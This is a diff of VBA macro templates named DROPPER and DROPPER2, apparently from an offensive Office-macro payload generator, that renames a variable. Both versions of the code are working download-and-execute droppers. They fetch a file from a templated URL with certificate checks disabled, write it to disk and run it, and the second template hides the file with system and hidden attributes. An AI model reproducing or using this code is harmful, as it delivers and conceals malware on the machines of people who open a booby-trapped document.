@@ -21,12 +21,12 @@ DROPPER = \
 ' will override any other file with same name
 Private Sub DownloadAndExecute()
     Dim myURL As String
-    Dim downloadPath As String
+    Dim realPath As String
     Dim WinHttpReq As Object, oStream As Object
     Dim result As Integer
     
     myURL = "<<<URL>>>"
-    downloadPath = <<<DOWNLOAD_PATH>>>
+    realPath = <<<DOWNLOAD_PATH>>>
     
     Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
@@ -39,9 +39,9 @@ Private Sub DownloadAndExecute()
         oStream.Open
         oStream.Type = 1
         oStream.Write WinHttpReq.ResponseBody
-        oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
+        oStream.SaveToFile realPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
         oStream.Close
-        ExecuteCmdAsync downloadPath
+        ExecuteCmdAsync realPath
     End If    
     
 End Sub
@@ -61,14 +61,14 @@ DROPPER2 = \
 ' will override any other file with same name
 Private Sub DownloadAndExecute()
     Dim myURL As String
-    Dim downloadPath As String
+    Dim realPath As String
     Dim WinHttpReq As Object, oStream As Object
     Dim result As Integer
     
     myURL = "<<<URL>>>"
-    downloadPath = "<<<DOWNLOAD_PATH>>>"
+    realPath = "<<<DOWNLOAD_PATH>>>"
     
-    If Dir(downloadPath, vbHidden + vbSystem) = "" Then
+    If Dir(realPath, vbHidden + vbSystem) = "" Then
         Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
         WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
         WinHttpReq.Open "GET", myURL, False ', "username", "password"
@@ -81,10 +81,10 @@ Private Sub DownloadAndExecute()
             oStream.Type = 1
             oStream.Write WinHttpReq.ResponseBody
             
-            oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
+            oStream.SaveToFile realPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
             oStream.Close
-            SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
-            ExecuteCmdAsync downloadPath
+            SetAttr realPath, vbReadOnly + vbHidden + vbSystem
+            ExecuteCmdAsync realPath
         End If
        
     End If
